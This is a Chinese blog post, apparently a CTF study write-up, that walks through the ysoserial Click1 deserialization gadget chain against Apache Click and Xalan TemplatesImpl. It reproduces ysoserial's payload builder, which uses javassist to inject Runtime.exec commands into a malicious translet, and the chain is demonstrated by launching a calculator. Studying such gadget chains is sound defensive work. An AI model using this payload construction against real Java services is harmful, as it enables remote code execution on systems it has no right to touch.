---
layout: post
title: Web-Java-反序列化漏洞-ysoserial-Click1
excerpt: "Apache Click是一个简单易上手的Java Web应用框架，它使用基于事件的编程模型来处理Servlet请求，使用Velocity(默认)、JSP、Freemarker渲染响应。本例演示了基于Apache Click项目的远程命令执行漏洞，Apache Click在2014年就已经进入Apache Attic。"
date:   2021-08-05 17:10:00
categories: [CTF]
comments: true

---

## 背景知识

1. *ysoserial*包含了许多针对通用Java依赖包的小工具链，可以在正常情况下通过使目标程序进行不安全的反序列化实现攻击利用。

2. Gadgets

   ```java
   /*
    *	java.util.PriorityQueue.readObject()
    *     java.util.PriorityQueue.heapify()
    *      java.util.PriorityQueue.siftDown()
    *        java.util.PriorityQueue.siftDownUsingComparator()
    *          org.apache.click.control.Column$ColumnComparator.compare()
    *            org.apache.click.control.Column.getProperty()
    *              org.apache.click.control.Column.getProperty()
    *                org.apache.click.util.PropertyUtils.getValue()
    *                  org.apache.click.util.PropertyUtils.getObjectPropertyValue()
    *                    java.lang.reflect.Method.invoke()
    *                      com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()
    *                      	TemplateImpl.newTransformer()
    *								TemplateImpl.getTransletInstance()
    *									TemplateImpl.defineTransletClasses()
    *                                  Class.newInstance() /* Invoke malicious constructor of malicious class*/
    */
   ```

3. Java序列化

   * Java原生序列化和反序列化将属性的类名同时写入到了序列化流中
   * Java反序列化时会调用ObjectInputStream的readObject()方法来进行反序列化
   * 无论反序列化是否成功，只要读取到类名就会加载这个类，如果该类有自定义的readObjec()就执行自定义的readObject()方法，如果没有就按照默认的readObject()流程执行，因此只要readObject()存在调用点，无论业务代码中是否使用了这些类，都会执行readObject()过程从而执行恶意代码

4. Apache Click

   * 框架采用`ClickServlet`来作为请求分发器，`ClickServlet`在请求到达时会创建一个`Page`对来来处理请求，然后使用这个`Page`对象的`Velocity template`渲染处理结果。

   * web.xml

     * Click Web应用如果想要使ClickServlet生效，必须在Web应用的`/WEB-INF/web.xml`中对`ClickServlet`注册，并且将所有的`*.htm`请求转发给`ClickServlet`处理，因为Click的页面模板默认采用`*.htm`后缀

     ```xml
     <web-app>
         <servlet>
             <servlet-name>ClickServlet</servlet-name>
             <servlet-class>org.apache.click.ClickServlet</servlet-class>
             <load-on-startup>0</load-on-startup>
         </servlet>
         <servlet-mapping>
             <servlet-name>ClickServlet</servlet-name>
             <url-pattern>*.htm</url-pattern>
         </servlet-mapping>
     </web-app>
     ```

   * click.xml

     * 一个Click应用的核心是`click.xml`配置文件，这个文件定义了应用的pages、headers、格式化对象、应用模式
     * Apache Click项目启动时，默认情况下`ClickServlet`会尝试加载`WEB-INF/click.xml`文件获取项目信息，如果未找到则会去classpath下继续寻找

     ```xml
     <click-app charset="UTF-8" locale="de">
         
         <!-- 为了帮助Apache click完成自动映射template和class的关系，指定pages类所在的包 -->
         <pages package="com.mycorp.banking.page">
             <!-- 因为index.html和它的Class不符合自动映射的规范，因此对这一个page进行手动映射-->
             <page path="index.htm" classname="com.mycorp.banking.page.Home"/>
         </pages>
         <!-- 再指定一个pages类所在的包 -->
         <pages package="com.mycorp.common.page"/>
         
         <format classname="com.mycorp.util.Format"/>
         
         <mode value="profile"/>
         <log-service classname="org.apache.click.extras.service.Log4JLogService"/>
     </click-app>
     ```

   * 页面自动映射

     ```txt
     index.htm => com.mycorp.page.Home
     search.htm => com.mycorp.page.Search
     contacts/contacts.htm => com.mycorp.page.contacts.Contacts
     security/login.htm => com.mycorp.page.security.Login
     security/logout.htm => com.mycorp.page.security.Logout
     ```

   * Pages-Template自动绑定

     * Page类内的public变量
     * Page类内使用`@Bindable`注解的变量

     ```java
     public class EmployeePage extends Page {
         public String employeeDescription;
         @Bindable protected Form employeeForm = new Form();
         @Bindable protected Table myTable = new Table();
     }
     ```
   
5. Apache Xalan

   * Apache Xalan是一个用来将XML文档转换为HTML、text及其它XML文档的XSLT处理器。
   * Apache Xalan 2.7.2实现了XSTL 1.0和XPATH1.0版本功能
   * Apache Xalan可以从命令直接调用，也可以在一个Applet或者Servlet中使用，或者集成在其他工程中作为一个模块使用。

## 验证过程

* 配置环境

  * `org.apache.click`:`click-nodeps:2.3.0`
  * `javax.servlet`:`javax.servlet-api:3.1.0`
  * `xalan`:`xalan:2.7.2`
  * jdk1.8(非必须)

* 修改ysoserial的PayloadRunner，因为它默认的攻击命令是`clack.exe`，但Ubuntu是没有这条指令的，因此需要对`getFirstExistingFile()`进行修改，在Ubuntu系统中因为存在gnome-calculator，所以如果攻击成功会启动Ubuntu的计算器

  <img src="https://monkeydatabase.github.io/img/image-20210806105905436.png" alt="image-20210806105905436" style="zoom:150%;" />

  ```java
  private static String getDefaultTestCmd() {
      return getFirstExistingFile(
          "C:\\Windows\\System32\\calc.exe",
          "/Applications/Calculator.app/Contents/MacOS/Calculator",
          "/usr/bin/gnome-calculator",
          "/usr/bin/kcalc"
      );
  }
  
  private static String getFirstExistingFile(String ... files) {
      //        return "calc.exe";
      for (String path : files) {
          if (new File(path).exists()) {
              return path;
          }
      }
      throw new UnsupportedOperationException("no known test executable");
  }
  ```

* 在IDEA中启动Click.java

  * 运行之前
  
    ![image-20210806105502285](https://monkeydatabase.github.io/img/image-20210806105502285.png)
  
  * 运行之后
  
    ![image-20210806105548287](https://monkeydatabase.github.io/img/image-20210806105548287.png)


## 攻击原理

1. 因为序列化的最外层为PriorityQueue\<Object\>对象，因此首先看`PriorityQueue.readObject()`

   * 读取PriorityQueue中存储的元素个数
   * 读取PriorityQueue中用于存储元素的数组的长度
   * 创建数组后，依次反序列化出各个元素并放入数组中
   * 因为PriorityQueue基于PriorityHeap，堆的数据结构采用数组，因此反序列化之后需要建堆

   ```java
   private void readObject(java.io.ObjectInputStream s)
       throws java.io.IOException, ClassNotFoundException {
       // Read in size, and any hidden stuff
       s.defaultReadObject();
   
       // Read in (and discard) array length
       s.readInt();
   
       queue = new Object[size];
   
       // Read in all elements.
       for (int i = 0; i < size; i++)
           queue[i] = s.readObject();
   
       // Elements are guaranteed to be in "proper order", but the
       // spec has never explained what that might be.
       heapify();
   }
   ```

2. 接下来看`PriorityQueue.heapify()`，其中`>>>`是无符号右移运算符，该建堆算法是数据结构中基础的算法，对每一个元素调用了`siftDown()`

   ```java
   private void heapify() {
       for (int i = (size >>> 1) - 1; i >= 0; i--)
           siftDown(i, (E) queue[i]);
   }
   ```

3. 接下来看`PriorityQueue.siftDown()`，它首先会检查PriorityQueue是否自定义了Comparator，如果存在自定义Comparator，则使用自定义Comparator作为比较的方法，因此在反序列化Click1 Payload时会调用`siftDownUsingComparator()`，其中调用了comparator.compare()方法，Payload使用的是`org.apache.click.control.Column$ColumnComparator`。

   ```java
   private void siftDown(int k, E x) {
       if (comparator != null)
           siftDownUsingComparator(k, x);
       else
           siftDownComparable(k, x);
   }
   
   private void siftDownUsingComparator(int k, E x) {
       int half = size >>> 1;
       while (k < half) {
           int child = (k << 1) + 1;
           Object c = queue[child];
           int right = child + 1;
           if (right < size && 
               comparator.compare((E) c, (E) queue[right]) > 0)
               c = queue[child = right];
           if (comparator.compare(x, (E) c) <= 0)
               break;
           queue[k] = c;
           k = child;
       }
       queue[k] = x;
   }
   ```

4. 接下来看，`org.apache.click.control.Column$ColumnComparator.compare()`

   ```java
   public ColumnComparator(Column column) {
       this.column = column;
   }
   
   public int compare(Object row1, Object row2) {
   
       this.ascendingSort = column.getTable().isSortedAscending() ? 1 : -1;
   
       Object value1 = column.getProperty(row1);
       Object value2 = column.getProperty(row2);
   
       if (value1 instanceof Comparable && value2 instanceof Comparable) {
   
           if (value1 instanceof String || value2 instanceof String) 
               return stringCompare(value1, value2)  * ascendingSort;
           else 
               return ((Comparable) value1).compareTo(value2) * ascendingSort;
   
       } 
       else if (value1 != null && value2 != null)
           return value1.toString()
           		.compareToIgnoreCase(value2.toString())
               	* ascendingSort;
       else if (value1 != null && value2 == null) 
           return +1 * ascendingSort;
       else if (value1 == null && value2 != null) 
           return -1 * ascendingSort;
       else 
           return 0;
   }
   ```

5. 接下来看，`Column.getProperty(Object row)`，在其中它会首先通过`getName()`获取我们的属性名即列名，该名称是创建Column对象时初始化的，在后期可以通过`setName()`修改，在获取name完成后会调用`Column.getProperty(String name, Object row)`重载方法

   > 在构造Payload过程中，曾调用过setName()将Column的名称由lowestSetBit修改为outputProperties

   ```java
   public Object getProperty(Object row) {
       return getProperty(getName(), row);
   }
   
   public String getName() {
       return name;
   }
   
   public void setName(String name) {
       this.name = name;
   }
   
   public Column(String name) {
       if (name == null) {
           throw new IllegalArgumentException("Null name parameter");
       }
       this.name = name;
   }
   ```

6. 接下来看`Column.getProperty(String name, Object row)`，因为构造Payload时往PriorityQueue中放入的是`BigInteger`对象和`org.apache.xalan.xsltc.trax.TemplatesImpl`对象而不是Map对象，所以他会进入else分支继续执行，它会将row、name、methodCache传入`PropertyUtils.getValue()`

   ```java
   public Object getProperty(String name, Object row) {
       if (row instanceof Map) {
           /* Leave lots of code for getProperty from the Map type of row according the column name*/
       } else {
           if (methodCache == null) {
               methodCache = new HashMap<Object, Object>();
           }
   
           return PropertyUtils.getValue(row, name, methodCache);
       }
   }
   ```

7. 接下来看`PropertyUtils.getValue()`，该方法使用name中出现的第一个`.`作为分隔符将name属性分为basePart和remainingPart，紧接着调用了将basePart传入`getObjectPropertyValue()`

   ```java
   public static Object getValue(Object source, String name, Map cache) {
       String basePart = name;
       String remainingPart = null;
   
       if (source instanceof Map) {
           return ((Map) source).get(name);
       }
   
       int baseIndex = name.indexOf(".");
       if (baseIndex != -1) {
           basePart = name.substring(0, baseIndex);
           remainingPart = name.substring(baseIndex + 1);
       }
   
       Object value = getObjectPropertyValue(source, basePart, cache);
   
       if (remainingPart == null || value == null) {
           return value;
   
       } else {
           return getValue(value, remainingPart, cache);
       }
   }
   ```

8. 接下来看`PropertyUtils.getObjectPropertyValue()`

   * 首先尝试从缓存中取出method，如果取不到，就从source(其实是用户放入PriorityQueue的对象)获取name的方法并尝试调用
   * 在构造Payload时首先向PriorityQueue中放入了两个BigInteger对象，之后又将PriorityQueue内部数组的第一个对象换成了含有恶意指令的`org.apache.xalan.xsltc.trax.TemplatesImpl`对象
   * 在构造Payload时，一开始将Column命名为”lowestSetBit“，但是在序列化之前通过setter方法将其修改为了`outputProperties`，因此在`ClickUtils.toGetterName(name)`会变成`getOutputProperties`
   * 因此最终反射调用的是`org.apache.xalan.xsltc.trax.TemplatesImpl.getOutputProperties()`

   ```java
   private static Object getObjectPropertyValue(Object source, String name, Map cache) {
       PropertyUtils.CacheKey methodNameKey = new PropertyUtils.CacheKey(source, name);
   
       Method method = null;
       try {
           method = (Method) cache.get(methodNameKey);
   
           if (method == null) {
               method = source.().getMethod(ClickUtils.toGetterName(name));
               cache.put(methodNameKey, method);
           }
           return method.invoke(source);
   
       } 
       /* Leave out lots of code for try-catch */
   }
   ```

9. 接下来看`org.apache.xalan.xsltc.trax.TemplatesImpl.getOutputProperties()`，其方法内部调用同类内的方法`TemplatesImpl.newTransformer()`

   ```java
   public synchronized Properties getOutputProperties() { 
       try {
           return newTransformer().getOutputProperties();
       }
       catch (TransformerConfigurationException e) {
           return null;
       }
   }
   ```

10. 接下来看`TemplateImpl.newTransformer()`，它首先调用了`getTransletInstance()`方法获取一个`Translet`，我们构造的command实际上被封装在了一个Translet类内，因此这是实现攻击**关键的最后几步**。

    ```java
    public synchronized Transformer newTransformer()
        throws TransformerConfigurationException 
    {
        TransformerImpl transformer;
    
        transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory);
    
        /* Leave out lots of code */
        return transformer;
    }
    ```
    
11. 接下来看`TemplateImpl.getTransletInstance()`

    * 检查`TemplateImpl._name`属性是否为空，如果为空就返回为空，获取`Translet`失败，因此如果使恶意载荷`Translet`顺利被执行，`TemplateImpl._name`必须不为空
    * 检查`TemplateImpl._bytecodes`属性是否为空，看源码中对该属性的注释可知这个`byte[][]`类型的值内存储着`translet`类和一些辅助类的字节码
    * 由源码的注释可知，`TemplateImpl._class`中存储了所有从`TemplateImpl._bytecodes`中通过`TemplateImpl.defineTransletClasses()`方法解析出来的Class对象
    * `TemplateImpl._transletIndex`存储了`TemplateImpl.defineTransletClasses()`在解析字节码过程中发现的`org.apache.xalan.xsltc.runtime.AbstractTranslet`的子类在`TemplateImpl._class`中的地址
    * `AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance()`通过反射调用了我们构造的Template中包含恶意指令的`Translet`的恶意构造方法，**攻击成功**

    ```java
    /**
     * Contains the actual class definition for the translet class and
     * any auxiliary classes.
     */
    private byte[][] _bytecodes = null;
    
    /**
     * Contains the translet class definition(s). These are created when 
     * this Templates is created or when it is read back from disk.
     */
    private Class[] _class = null;
    
    /**
     * The index of the main translet class in the arrays _class[] and
     * _bytecodes.
     * It is set by some codes during TemplateImpl.defineTransletClasses() as follows：
     * private static String ABSTRACT_TRANSLET 
     * = "org.apache.xalan.xsltc.runtime.AbstractTranslet";
     * if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
     * 		_transletIndex = i;
     * }
     */
    private int _transletIndex = -1;
    
    
    
    private Translet getTransletInstance()
        throws TransformerConfigurationException {
        try {
            if (_name == null) return null;
    
            if (_class == null) defineTransletClasses();
    
            // 攻击成功语句-----------------------------------
            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
            // 攻击成功语句-----------------------------------
            translet.postInitialization();
            translet.setTemplates(this);
            if (_auxClasses != null) {
                translet.setAuxiliaryClasses(_auxClasses);
            }
    
            return translet;
        }
        /* Leave out lots of code for try-catch */
    }
    ```


## 独立思考

### 1、为什么构造Payload时不在一开始就把Column的name设置为outputProperties，而要在创建对象之后通过Setter去修改？

* 在构建Payload时需要，需要创建一个PriorityQueue，创建之后需要往里面存入元素
* 然而声明PriorityQueue时需要传入一个Comparator，这是因为PriorityQueue是基于堆的，每插入一个一元素就需要调整堆
* 调整堆的过程中势必触发ColumnComparator的compare方法，它因为因开始传入的元素不是Map又会按照之前的攻击调用链去调用队列中元素的名称为getXXX(其中XXX就是我们给Column设置的name)的方法，为了避免对攻击方的电脑造成误伤，所以一开始放入的元素是BigInteger，设置的名字是lowestSetBit，这样调用的就是`BigInteger.getLowestSetBit()`，这个方法对攻击方的电脑是无伤的。
* 初始化完成指定大小的堆之后，通过反射去直接操作PriorityQueue的queue数组，因为并没有调用`PriorityQueue.add()`并不会触发重新建堆，所以可以后续修改而且对攻击者电脑无伤。
* 在序列化Payload的过程中，PriorityQueue的writeObject只是把它内部的queue数组按顺序序列化了，也没有重新建堆后再序列化，所以序列化过程中对攻击者电脑也是无伤的。

### 2、ysoserial是如何根据用户输入的command构造恶意Templates的？

* `ysoserial.payloads.util.Gadgets`类中含有根据command构建Templates的代码，其中也声明了一个`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`的实现类，其中的方法是均是空实现，后续构造恶意Translet的时候会使用`javassist`对该类的字节码进行修改，从而达到构造恶意Translet的目的。

  ```java
  public static class StubTransletPayload extends AbstractTranslet implements Serializable {
  
      private static final long serialVersionUID = -5971610431559700674L;
  
      public void transform ( DOM document, SerializationHandler[] handlers ) \
          throws TransletException {}
  
      @Override
      public void transform ( DOM document, DTMAxisIterator iterator, SerializationHandler handler ) 
          throws TransletException {}
  }
  ```

* 首先Click1调用了`Gadgets.createTemplatesImpl(final String command)`，由于没有配置properXalan属性，走到了最后一句

  ```java
  public static Object createTemplatesImpl ( final String command ) throws Exception {
      if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
          return createTemplatesImpl(
              command,
              Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
              Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
              Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
      }
      return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
  }
  ```

* 然后看`Gadgets.createTemplatesImpl()`的重载方法

  * 该方法第一个参数为攻击指令，第二个参数为模板类，第三个参数为Translet的抽象父类，第四个参数为
  * 可以看到它使用`ClassPool`、`CtClass`等类操作字节码，这些类来自`javassit`包
    * `ClassPool`是一个`CtClass`的容器，所有的`CtClass`必须从该容器中获取
      * `ClassPool.insertClassPath(ClassPath cp)`会将输入的ClassPath放入ClassPool中
      * `ClassPool.get(String name)`会检索之前放入的ClassPath直到找到符合的类文件，读取类文件并根据类文件创造出CtClass对象
    * `CtConstructor`代表一个CtClass的构造器，它继承了`CtBehavior`抽象类，因此它含有`CtBehavior`中的方法
    * `CtBehavior`是`CtConstructor`和`CtMethod`的父类
      * `CtBehavior.insertAfter(String src)`将内容插入到**当前主体的最后**但**在`Return`语句之前**的位置，如果入参src编译出错会抛出`CannotCompileException`异常
    * `CtClass`对象全部是从`ClassPool`中取出的根据`.class`文件构造出来的
      * `CtClass.makeClassInitializer()`为当前类生成一个空构造器CtClass，如果之前有构造器就返回之前已经有的构造器。

  ```java
  public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
      throws Exception {
      final T templates = tplClass.newInstance();
  
      // 将StubTransletPayload和Payload所需抽象父类放入ClassPool
      ClassPool pool = ClassPool.getDefault();
      pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
      pool.insertClassPath(new ClassClassPath(abstTranslet));
      
      // 获取StubTransletPayload的CtClass便于修改
      final CtClass clazz = pool.get(StubTransletPayload.class.getName());
      // 将攻击者输入的恶意指令拼接为Java语句
      String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
          command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
          "\");";
      // 将恶意Java语句插入CtClass的无参构造器中
      clazz.makeClassInitializer().insertAfter(cmd);
      // 将类名随机化便于多次攻击，避免因为类重名而攻击失败
      clazz.setName("ysoserial.Pwner" + System.nanoTime());
      // 为其赋予被攻击程序要检查的父类类型
      CtClass superC = pool.get(abstTranslet.getName());
      clazz.setSuperclass(superC);
      // 将其字节码导出
      final byte[] classBytes = clazz.toBytecode();
  
      // 通过反射将恶意类的字节码赋值给模板类中存储字节码的属性
      Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
          classBytes, ClassFiles.classAsBytes(Foo.class)
      });
  
      Reflections.setFieldValue(templates, "_name", "Pwnr");
      Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
      return templates;
  }
  ```

## 产生过的疑问

1. 为什么构造Payload时不在一开始就把name设置为outputProperties，而要在创建对象之后通过Setter去修改？
2. ysoserial是如何根据用户输入的command构造恶意Templates的？